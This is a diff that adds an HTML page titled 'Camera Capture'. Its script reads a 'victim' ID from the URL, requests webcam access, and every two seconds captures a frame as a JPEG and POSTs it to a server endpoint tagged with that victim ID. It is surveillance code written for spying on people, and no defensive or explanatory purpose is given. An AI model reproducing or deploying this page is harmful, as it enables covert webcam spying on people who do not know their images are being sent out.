@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const victimId = new URLSearchParams(window.location.search).get('victim');
+
+        if (!victimId) {
+            alert("Victim ID missing!");
+        }
+
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setInterval(captureFrame, 2000); // كل ثانيتين
+            })
+            .catch(err => console.error("Camera access denied:", err));
+
+        function captureFrame() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg");
+            sendFrame(imageData);
+        }
+
+        async function sendFrame(imageData) {
+            try {
+                await fetch(`/api/camera_frame?victim=${victimId}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageData })
+                });
+            } catch (err) {
+                console.error("Error sending frame:", err);
+            }
+        }
+    </script>
+</body>
+</html>
